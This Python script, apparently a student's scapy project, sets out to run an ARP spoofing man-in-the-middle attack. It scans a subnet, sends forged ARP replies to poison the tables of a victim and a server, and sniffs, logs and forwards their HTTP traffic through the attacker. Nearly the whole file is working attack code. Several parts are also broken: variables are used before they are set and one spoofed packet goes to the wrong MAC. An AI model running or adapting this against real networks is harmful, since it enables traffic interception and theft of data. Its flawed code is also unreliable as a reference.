import scapy.all as sc;
import argparse;
import time;

# TODO:
# - Mitm optie maken die je automatisch mitm maakt
# - Silent vs All out options

### This is the file for ARP poisoning. I'm not sure if it works or how to test it :) 
# first listen to ARP broadcast, then respond to victim, dan spam server with arp request, send victim a lot of arp responses and hope that we are the quickest.

# Example run code that should do something, where x is ip range: 
# python ARPpoisoning.py --scan x 
# When specific victim and server are found, where y and z are ip adresses: 
# python ARPpoisoning.py --victim y --server z


## First is my attempt at scanning the network. I'm not sure if this work and if this is what we wanted it to do if it does work.
# Scanning network for devices, this returns (or is supposed to return) all live hosts in a given range 'ip'.
def network_scan(ip_range, batch_threshold=256):
    hosts = []
    try:
        network = sc.ipaddress.ip_network(ip_range, strict=False)
        
        if network.num_addresses <= batch_threshold:
            hosts.extend(_scan_single_range(str(network)))
        else:
            new_prefix = max(24, network.prefixlen)
            for subnet in network.subnets(new_prefix=new_prefix):
                print(f"Scanning {subnet}...")
                hosts.extend(_scan_single_range(str(subnet)))
    except ValueError as e:
        print(f"[!] Invalid IP range: {ip_range} - {e}")
    return hosts

def _scan_single_range(ip):
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / arp
    packet_pairs = sc.srp(final_packet, timeout=2, verbose=False)[0]
    hosts = []
    for sent, received in packet_pairs:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
    return hosts

## Here is where the main parts of the ARP poisoning is supposed to happen. 
# 1. We need to be able to start the poisoning attack.
# 2. We need to be able to get a current MAC adress. 
# 3. we need to stop the attack in a proper way.


# (2.) Get the MAC adress of a given IP adress
def get_mac(ip):
    # First we do the same as in network scan.
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp
    packet_pairs = sc.srp(packet, timeout=2, verbose=False)[0]
    # Now get MAC adress if something replies
    for sent, received in packet_pairs:
        return received.hwsrc
    return None

## Now to start the attack, keep it goining, and stop it when we want.
# We try to keep the ARP table of the victim poisoned by sending packets in a loop.
def arp_poisoning(victim_ip, server_ip, mode):
    print("pre try", victim_ip, server_ip)
    try:
        victim_mac = ""
        server_mac = ""

        if (victim_ip is not None and server_ip is None):
            victim_mac = get_mac(victim_ip)
            pkt =  sc.sniff(filter="arp", iface=sc.conf.iface, store=1, stop_filter=lambda pkt: check_arp_client(pkt, victim_ip))[0]
            server_ip = arp.pdst
                
    
        elif (victim_ip is None and server_ip is None):
            pkt =  sc.sniff(filter="arp", iface=sc.conf.iface, store=1)[0]
            if pkt.haslayer(sc.ARP):
                arp = pkt[sc.ARP]
                if arp.op == 1:
                    victim_ip = arp.psrc
                    server_ip = arp.pdst
                    victim_mac = get_mac(victim_ip)

        else:
            print("else")
            victim_mac = get_mac(victim_ip)
            server_mac = get_mac(server_ip)
            attacker_mac = sc.get_if_hwaddr(sc.conf.iface)
            fake_packet_victim = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
            fake_packet_server = sc.Ether(dst=server_mac)/sc.ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip, hwsrc=attacker_mac)
            if mode == "silent":
                sc.sendp(fake_packet_victim, verbose=False)
                sc.sendp(fake_packet_server, verbose=False)
                return server_mac, victim_mac
            else:        
                print("sniffing")               
                sc.sendp(fake_packet_victim, verbose=False)
                sc.sendp(fake_packet_server, verbose=False)
                print("found pkt")
                for i in range(5):  # run the loop 5 times
                    print("sending")
                    sc.sendp(fake_packet_victim, verbose=False)
                    sc.sendp(fake_packet_server, verbose=False)
                    print("i:", i)
                return server_mac, victim_mac
            
        if mode == "silent":
            fake_packet_victim = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
            sc.sendp(fake_packet_victim, verbose=False)
            server_mac = get_mac(server_ip)
            fake_packet_server = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip, hwsrc=attacker_mac)
            sc.sendp(fake_packet_server, verbose=False)
        else:
            fake_packet_victim = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
            sc.sendp(fake_packet_victim, verbose=False)
            server_mac = get_mac(server_ip)
            fake_packet_server = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip, hwsrc=attacker_mac)
            for i in range(5):  # run the loop 5 times
                sc.sendp(fake_packet_victim, verbose=False)
                sc.sendp(fake_packet_server, verbose=False)
                print("i:", i)
                #time.sleep(2)
    except KeyboardInterrupt:
        pass
    finally:
        return server_mac, victim_mac
    


def check_arp_server_client(pkt, server_ip, client_ip):
    if pkt.haslayer(sc.ARP):
        arp = pkt[sc.ARP]
        if arp.op == 1 and arp.psrc == client_ip and arp.pdst == server_ip:
            return True
    return False

def check_arp_client(pkt,client_ip):

    if pkt.haslayer(sc.ARP):
        arp = pkt[sc.ARP]
        if arp.op == 1 and arp.psrc == client_ip:
            return True
    return False


## forwarding method

def own_server(clientIP, serverIP, attackerIP):
    while True:
        pkt = sc.sniff(
            filter="tcp port 80",
            iface=sc.conf.iface,
            store=True,
            count=1,
            lfilter=lambda p: p.haslayer(sc.IP) and p.haslayer(sc.TCP)
        )[0]
        log_packet(pkt)

        if pkt[sc.IP].src == clientIP:
            # Forward client packet to the attacker-chosen server
            forward_to_server(pkt, attackerIP, serverIP)
            if is_rst(pkt) or is_tcp_fin(pkt):
                return

        elif pkt[sc.IP].src == serverIP:
            # Forward response from attacker-chosen server back to client
            forward_to_client(pkt, attackerIP, clientIP)
            if is_rst(pkt) or is_tcp_fin(pkt):
                return


def forward_to_server(pkt, attackerIP, serverIP):
    ip = sc.IP(src=attackerIP, dst=serverIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    new_pkt = ip / tcp
    if pkt.haslayer(sc.Raw):
        new_pkt = new_pkt / sc.Raw(load=pkt[sc.Raw].load)
    sc.send(new_pkt, iface=sc.conf.iface, verbose=False)


def forward_to_client(pkt, attackerIP, clientIP):
    ip = sc.IP(src=attackerIP, dst=clientIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    new_pkt = ip / tcp
    if pkt.haslayer(sc.Raw):
        new_pkt = new_pkt / sc.Raw(load=pkt[sc.Raw].load)
    sc.send(new_pkt, iface=sc.conf.iface, verbose=False)


def is_rst(pkt):
    return sc.TCP in pkt and 'R' in pkt[sc.TCP].flags

def is_tcp_fin(pkt):
    return sc.TCP in pkt and 'F' in pkt[sc.TCP].flags

def log_packet(pkt, filename="packet_log.txt"):
    with open(filename, "a") as f:
        f.write("=== Packet Captured ===\n")
        f.write(pkt.summary() + "\n") 
        f.write(str(pkt.show(dump=True))) 
        f.write("\n=======================\n\n")